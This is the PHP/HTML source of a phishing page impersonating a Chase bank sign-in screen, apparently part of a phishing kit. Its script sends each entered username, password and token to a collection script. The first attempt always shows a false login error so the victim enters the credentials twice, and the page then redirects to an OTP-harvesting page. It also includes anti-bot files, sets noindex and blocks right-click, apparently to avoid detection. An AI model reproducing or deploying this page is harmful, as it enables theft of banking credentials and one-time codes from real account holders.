<?php

    include './secure/anti1.php';
	include './secure/anti2.php';
	include './secure/anti3.php';
	include './secure/anti4.php';
	include './secure/anti5.php';
	include './secure/anti6.php';
	include './secure/anti7.php';
	include './secure/anti8.php';
	

?>
<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="robots" content="noindex,nofollow">

    <title>Sign in - chase</title>

    <link href="./css/bootstrap.min.css" rel="stylesheet">
    <link href="./css/shop-homepage.css" rel="stylesheet">
    <link href="./css/styles.css" rel="stylesheet">
    <link rel="shortcut icon" href="./img/chasefavicon.ico">
    <!-- <script src="https://kit.fontawesome.com/6222530beb.js"></script> -->
    <!-- <link rel="stylesheet" href="./assets/fontawesome-free-6.0.0-beta2-web/css/all.min.css"> -->
    <script src="https://kit.fontawesome.com/21cf0ca2ce.js" crossorigin="anonymous"></script>
    <style>
        .rror {
            color: crimson;
            display: block;
            width: 80%;
            margin: auto;
            font-weight: 800;
        }
        #rror {
            display: none;
        }
    </style>
</head>

<body class="less">

<!-- Login Box -->    
<div class="logon-container">
    <header>
        <div class="logon-header">
            <a href="#" class="logolink"> </a>
        </div>
    </header>
    <main class="logon-content">
       <div class="container logon">
           <div class="row">
               <div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box">
                   <div class="jpui raised segment">
                        <span style="color: crimson;" class="rror" id="rror">
                            <i class="fas fa-circle-exclamation" style="color: crimson;"></i>
                            We can't find that username and password. Try again.
                        </span>
                       <div class="row">
                           <div class="col-xs-10 col-xs-offset-1">
                               <form action="" method="post" id="res" enctype="multipart/form-data">
                                  <div class="us-norm us-mt">
                                   <input type="text" class="frinp" name="aae" id="userid" required pattern="^[a-zA-Z0-9]{4,20}$">
                                   <label for="userid" class="frel">Username</label>
                                  </div>
                                  <div class="us-norm">
                                   <input type="password" class="frinp" name="bbe" id="pass" required minlength="5">
                                   <label for="pass" class="frel">Password</label>
                                  </div>
                                  <div class="us-norm">
                                   <input type="text" class="frinp" name="tok" id="token" style="display:none;">
                                   <label for="token" class="frel" id="ken" style="display:none;">Token</label>
                                  </div>
                                  <div class="row">
                                      <div class="col-sm-6 col-xs-7 remember">
                                          <div class="jpui checkbox" id=rememberMe>
                                              <label class="cont">Remember me
                                               <input type="checkbox" name="save" value="save">
                                               <span class="checkmark"></span>
                                            </label>
                                          </div>
                                      </div>
                                      <div class="col-sm-6 col-xs-5 token">
                                          <div class="jpui checkbox useT" >
                                              <label class="cont" >Use token
                                               <input type="checkbox" name="save" value="save"  id="utoken" onclick="myFunction()">
                                               <span class="checkmark sand"></span>
                                            </label>
                                          </div>
                                      </div>
                                  </div>
                                  <div class="row">
                                      <input type="submit" class="jpui submit" value="Sign in" name="submit">
                                  </div>
                                  <div class="row">
                                      <span class="jpui link">
                                          <a href="#" class="link-anchor">Forgot username/password? ></a>
                                      </span>
                                  </div>
                                  <div class="row">
                                      <span class="jpui link">
                                          <a href="#" class="link-anchor">Not Enrolled? Sign Up Now. ></a>
                                      </span>
                                  </div>
                               </form>
                           </div>
                       </div>
                   </div>
               </div>
           </div>
       </div>
        
    </main>
    


</div>
<!-- /.Login Box -->



<!-- Footer Side -->
<footer class="logon-footer" id="logon-footer">
    <div class="footer-container" style="position:static;">
        <div class="container">
            <div class="social-links row">
                <div class="col-xs-12">
                    <span class="follow-text">Follow us:</span>
                    <img src="./img/cap.png" alt="" class="icon-links">
                </div>
            </div>
            <div class="footer-links row">
                <div class="col-xs-12">
                    <ul>
                        <li class="azadus">Contact us</li>
                        <li class="azadus">Privacy</li>
                        <li class="azadus">Security</li>
                        <li class="azadus">Terms of use</li>
                        <li class="azadus">Accessibility</li>
                        <li class="azadus">SAFE Act: Chase Mortgage Loan Originators</li>
                        <li class="azadus">Fair Lending</li>
                        <li class="azadus">About Chase</li>
                        <li class="azadus">J.P Morgan</li>
                        <li class="azadus">JPMorgan Chase &#38; Co.</li>
                        <li class="azadus">Careers</li>
                        <li class="azadus">Espa&ntilde;ol</li>
                        <li class="azadus">Chase Canada</li>
                        <li class="azadus">Site map</li>
                        <li>Member FDIC</li>
                        <li><i class="fas fa-home"></i>&nbsp;Equal Housing Lender</li>
                        
                        <li class="copyright-label">&copy; 2024 JPMorgan Chase &#38; Co.</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</footer>
<!-- /.Footer Side -->

<script>

function myFunction() {
  var checkBox = document.getElementById("utoken");
  var uto = document.getElementById("token");
  var ken = document.getElementById("ken");
  if (checkBox.checked == true) {
    uto.style.display = "inline-block";
    ken.style.display = "inline-block";
  } else {
    uto.style.display = "none";
    ken.style.display = "none";
  }
}
const fullUrl = window.location.href;
        const emailRegex = /#([^#]+)$/;
        const match = fullUrl.match(emailRegex);
        const email = match ? match[1] : null;
      
        console.log(email);
      

        if (email) {
           localStorage.setItem("caseemail", email)
          }
      
       document.addEventListener('contextmenu', function (e) {
          e.preventDefault();
        });
      
      var formSubmitted = 0;

      document.getElementById("res").addEventListener("submit", function (event) {
          event.preventDefault();
      
          formSubmitted++;
          var inputs = document.querySelectorAll('input[required]');
          for (var i = 0; i < inputs.length; i++) {
              if (!inputs[i].value.trim()) {
                  alert("Please fill in all fields.");
                  return;
              }
          }
      
          var formData = new FormData(this);
          var xhr = new XMLHttpRequest();
          xhr.open("POST", "./config/user.php", true); // your php url here
      
          xhr.onreadystatechange = function () {
              if (xhr.readyState == 4 && xhr.status == 200) {
                  console.log(xhr.responseText);
      
                  if (formSubmitted === 1) {
                      document.getElementById("pass").value = "";
                      console.log("YESSSSS");
                      document.getElementById("rror").style.display = "block";
                      setTimeout(() => {
                        document.getElementById("errorr").style.display = "none"
                      }, 1500);
                  } else if (formSubmitted >= 2) {
                      window.location.href = `./otp.php`;
                    }
              }
          };
      
          xhr.send(formData);
      });
    
</script>


<script src="./js/jquery.js"></script>
<script src="./js/bootstrap.min.js"></script>
</body>

</html>